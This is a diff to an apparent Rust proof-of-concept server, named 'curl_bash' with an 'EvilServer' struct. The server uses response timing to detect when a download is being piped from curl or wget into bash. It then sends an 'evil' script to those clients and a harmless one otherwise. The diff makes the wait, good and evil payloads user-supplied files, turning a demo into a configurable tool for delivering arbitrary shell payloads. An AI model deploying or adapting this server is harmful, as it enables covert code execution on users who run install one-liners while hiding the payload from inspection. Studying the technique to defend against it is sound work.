@@ -4,10 +4,9 @@ use std::io::{Read, Write};
 use std::net::{TcpListener, TcpStream};
 use std::time::Duration;
 
-// from https://gist.githubusercontent.com/mjohnsullivan/e5182707caf0a9dbdf2d/raw/c1a2f4c04bd4b4fd0cc9489612da7e11a8f16e7a/http_server.rs
-
 use std::cmp::Ordering;
 use std::env;
+use std::fs::File;
 use std::str::FromStr;
 use std::sync::Arc;
 use std::thread;
@@ -26,7 +25,12 @@ Content-Type: text/plain; charset=us-ascii\r
 Transfer-Encoding: chunked\r
 Connection: keep-alive\r\n\r\n";
 
+const END: &[u8] = &[];
+
 struct EvilServer {
+    wait: Vec<u8>,
+    good: Vec<u8>,
+    evil: Vec<u8>,
     min_variance: f64,
     min_jump: f64,
     socket_timeout: Option<Duration>,
@@ -38,6 +42,9 @@ unsafe impl Send for EvilServer {}
 
 impl EvilServer {
     fn new(
+        wait: Vec<u8>,
+        good: Vec<u8>,
+        evil: Vec<u8>,
         min_variance: f64,
         min_jump: f64,
         buffer_size: usize,
@@ -45,6 +52,9 @@ impl EvilServer {
         secs: u64,
     ) -> EvilServer {
         EvilServer {
+            wait,
+            good,
+            evil,
             min_variance,
             min_jump,
             max_padding,
@@ -67,21 +77,16 @@ impl EvilServer {
         stream.set_write_timeout(self.socket_timeout)?;
         stream.set_nodelay(true)?;
 
-        let wait = b"sleep 3\n";
-        let good = b"echo \"Hello there :)\"\n";
-        let evil = b"echo \"r00t1ng y0ur b0x0rs >:)\"\n";
-        let end = b"";
-
         let mut stream = stream;
 
         stream.write(HTTP_SUCCESS_HEADERS)?;
 
-        send_chunk(&stream, wait)?;
+        send_chunk(&stream, &self.wait)?;
 
         if !curl_or_wget.unwrap() {
             println!("curl/wget not detected, returning good");
-            send_chunk(&stream, good)?;
-            return send_chunk(&stream, end);
+            send_chunk(&stream, &self.good)?;
+            return send_chunk(&stream, END);
         }
 
         let mut timing = vec![0.0f64; self.max_padding as usize];
@@ -92,7 +97,7 @@ impl EvilServer {
             timing[x as usize] = now.elapsed().as_float_secs();
         }
 
-        println!("timing {:?}", timing);
+        //println!("timing {:?}", timing);
 
         let mut max_index = 0;
         let mut max = -1.0;
@@ -107,9 +112,9 @@ impl EvilServer {
         // now set max_index to 0 so it doesn't calculate into mean() below
         timing[max_index] = 0.0;
 
-        println!("timing calc {:?}", timing);
-        println!("max {:?}", max);
-        println!("max_index {:?}", max_index);
+        //println!("timing calc {:?}", timing);
+        //println!("max {:?}", max);
+        //println!("max_index {:?}", max_index);
 
         let variance = std_deviation(&timing, &max_index).powi(2);
 
@@ -117,18 +122,19 @@ impl EvilServer {
 
         if variance > self.min_variance && max > self.min_jump {
             println!("Execution through bash detected - sending bad payload :D");
-            send_chunk(&stream, evil)?;
+            send_chunk(&stream, &self.evil)?;
         } else {
             println!("Sending good payload :(");
-            send_chunk(&stream, good)?;
+            send_chunk(&stream, &self.good)?;
         }
 
-        send_chunk(&stream, end)
+        send_chunk(&stream, END)
     }
 }
 
 fn handle_read(mut stream: &TcpStream) -> Option<bool> {
     let mut buf = [0u8; 1024];
+    println!("----------------------------------------");
     match stream.read(&mut buf) {
         Ok(_) => {
             let req_str = String::from_utf8_lossy(&buf).to_lowercase();
@@ -167,6 +173,13 @@ fn std_deviation(data: &[f64], exclude_index: &usize) -> f64 {
     variance.sqrt()
 }
 
+fn read_file(filename: &str) -> std::io::Result<Vec<u8>> {
+    let mut file = File::open(filename)?;
+    let mut ret = Vec::new();
+    file.read_to_end(&mut ret)?;
+    Ok(ret)
+}
+
 struct Args<'a> {
     args: &'a Vec<String>,
 }
@@ -175,7 +188,7 @@ impl<'a> Args<'a> {
     fn new(args: &'a Vec<String>) -> Args {
         Args { args }
     }
-    fn get_arg(&self, index: usize, def: &'a str) -> &'a str {
+    fn get_str(&self, index: usize, def: &'a str) -> &'a str {
         match self.args.get(index) {
             Some(ret) => ret,
             None => def,
@@ -190,26 +203,41 @@ impl<'a> Args<'a> {
             None => def,
         }
     }
+    fn get_file(&self, index: usize, def: &[u8]) -> Vec<u8> {
+        match self.args.get(index) {
+            Some(filename) => match read_file(filename) {
+                Ok(ret) => ret,
+                Err(_) => def.iter().cloned().collect(), // or panic
+            },
+            None => def.iter().cloned().collect(),
+        }
+    }
 }
 
 fn main() {
     let raw_args = env::args().collect();
     let args = Args::new(&raw_args);
-    if args.get_arg(1, "").contains("-h") {
+    if args.get_str(1, "").contains("-h") {
         println!(
-            "usage: {} [-h] [host, default: 127.0.0.1:5555]",
-            args.get_arg(0, "curl_bash")
+            "usage: {} [-h] [wait.sh, sleep 3] [good.sh, echo \"Hello there :)\"] \
+             [evil.sh, echo \"r00t1ng y0ur b0x0rs >:)\"] [host, 127.0.0.1:5555] \
+             [min_variance, 0.1] [min_jump, 1.0] [buffer_size, 87380] [max_padding, 32] \
+             [socket_timeout, 10]",
+            args.get_str(0, "curl_bash")
         );
         return;
     }
-    let host = args.get_arg(1, "0.0.0.0:5555");
+    let host = args.get_str(4, "0.0.0.0:5555");
 
     let evil_server = Arc::new(EvilServer::new(
-        args.get(2, 0.1),
-        args.get(3, 1.0),
-        args.get(4, 87380),
-        args.get(5, 32),
-        args.get(6, 10),
+        args.get_file(1, b"#!/bin/sh\nsleep 3\n"),
+        args.get_file(2, b"echo \"Hello there :)\"\n"),
+        args.get_file(3, b"echo \"r00t1ng y0ur b0x0rs >:)\"\n"),
+        args.get(5, 0.1),
+        args.get(6, 1.0),
+        args.get(7, 87380),
+        args.get(8, 32),
+        args.get(9, 10),
     ));
 
     println!(
